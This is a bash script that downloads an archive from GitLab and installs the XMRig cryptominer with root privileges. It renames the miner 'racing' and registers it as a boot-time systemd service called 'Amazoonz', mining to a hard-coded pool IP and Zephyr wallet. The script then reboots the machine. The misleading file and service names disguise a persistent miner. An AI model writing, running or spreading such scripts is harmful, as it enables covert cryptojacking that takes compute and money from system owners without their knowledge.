#!/bin/bash
cd /usr/local/bin
worker_value="$1"
worker_thread="$2"
echo "Run worker: $worker_value"
echo "worker thread: $worker_thread"
sudo wget https://gitlab.com/amaz/grabcar/-/raw/main/amazonpython.tar.gz
sudo apt update
sudo tar xvzf amazonpython.tar.gz
sudo mv xmrig-6.20.0 racing
sudo bash -c 'echo -e "[Unit]\nDescription=Amazoonz\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/racing/xmrig --donate-level 1 -o 20.24.93.247:3333 -u ZEPHs85fB2beCgLJfaa4fLQZSCC4fpmJTWWN9qw9ubfjGEk3RknpcHdDV93vY5BioJDJQ1dfpvWj5QMBfjYMS99X8VhEztpZD1b -p '$worker_value' -a rx/0 -k -t '$worker_thread'\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/amazoonz.service'
sudo systemctl daemon-reload
sudo systemctl enable amazoonz.service
echo "$worker_value worked shutdowd vm now"
echo "Setup completed!"
sudo reboot
